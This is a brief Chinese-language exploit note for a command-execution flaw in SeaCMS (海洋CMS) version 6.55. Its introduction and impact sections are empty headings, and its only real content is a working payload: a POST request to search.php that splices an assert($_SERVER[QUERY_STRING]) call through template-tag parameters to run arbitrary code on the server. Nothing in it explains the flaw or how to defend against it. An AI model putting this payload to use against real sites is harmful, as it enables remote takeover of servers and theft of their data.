海洋CMS V6.55 命令执行
======================

一、漏洞简介
------------

二、漏洞影响
------------

三、复现过程
------------

path:

    http://0-sec.org/search.php

POST:

    searchtype=5&searchword={if{searchpage:year}&year=:as{searchpage:area}}&area=s{searchpage:letter}&letter=ert{searchpage:lang}&yuyan=($_SE{searchpage:jq}&jq=RVER{searchpage:ver}&&ver=[QUERY_STRING]));/
